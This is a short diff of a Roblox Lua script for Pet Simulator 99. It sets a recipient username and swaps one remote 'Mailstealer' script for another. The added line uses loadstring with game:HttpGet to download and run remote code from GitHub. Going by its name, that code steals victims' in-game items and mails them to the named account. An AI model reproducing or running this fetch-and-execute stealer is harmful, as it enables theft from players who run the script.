@@ -1,5 +1,2 @@
 Username = "dungvt12256"
-G_LoadingScreen = "YajzaHub"
-G_Mailmessage = "YajzaHubTHX"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/PetSimulator99/main/Mailstealer"))()
